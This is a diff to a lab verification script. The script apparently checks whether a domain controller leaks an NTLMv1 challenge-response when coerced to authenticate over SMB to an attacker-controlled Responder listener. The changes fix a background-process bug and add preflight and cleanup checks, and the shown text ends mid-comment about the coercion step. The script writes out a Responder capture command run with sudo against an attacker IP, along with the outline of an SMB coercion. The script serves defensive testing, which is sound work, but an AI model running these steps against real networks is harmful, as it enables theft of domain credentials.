@@ -3,17 +3,42 @@
 # PASS (exit 0) iff the DC will not produce an NTLMv1 challenge-response
 # when SMB-pulled to an attacker-controlled listener.
 
-set -euo pipefail
-cd "$(mktemp -d)"
+set -uo pipefail
+
+# Tool preflight. Kali installs responder at /usr/sbin/responder, not
+# /usr/bin/responder, and the old provisioner never installed it at all.
+# The lab image now symlinks it; assert rather than assume.
+if [ ! -x /usr/bin/responder ]; then
+    echo "[verify-poc-14] HARNESS ERROR: /usr/bin/responder missing" >&2
+    echo "[verify-poc-14] Kali ships it at /usr/sbin/responder; the attacker image symlinks it" >&2
+    exit 2
+fi
+
+cd "$(mktemp -d)" || { echo "[verify-poc-14] HARNESS ERROR: mktemp failed" >&2; exit 2; }
 
 ATTACKER_IP=10.20.30.10
 DC_IP=10.20.30.5
 
 # Spin up a temporary SMB-listening Responder.
+#
+# The previous form was:
+#     (timeout 30 sudo /usr/bin/responder ... &)
+#     RESP_PID=$!
+# The `&` sat INSIDE the subshell, so $! was never set in this shell. Under
+# `set -u` that made line 15 an unbound-variable error and the script died
+# before probing anything -- which is why this scenario could never pass even
+# on a correctly vulnerable host.
 RESP_LOG=$(pwd)/responder.log
-(timeout 30 sudo /usr/bin/responder -I eth0 -A -wF >"$RESP_LOG" 2>&1 &)
+timeout 30 sudo /usr/bin/responder -I eth0 -A -wF >"$RESP_LOG" 2>&1 &
 RESP_PID=$!
+trap 'kill "$RESP_PID" 2>/dev/null || true; sudo pkill -f "responder -I eth0" 2>/dev/null || true' EXIT
 sleep 2
+
+if ! kill -0 "$RESP_PID" 2>/dev/null; then
+    echo "[verify-poc-14] HARNESS ERROR: responder failed to start" >&2
+    cat "$RESP_LOG" >&2 || true
+    exit 2
+fi
 
 # Trigger the DC to authenticate to attacker by mounting a UNC share. We
 # coerce via SMB lookup: smbclient as alice attempts to list
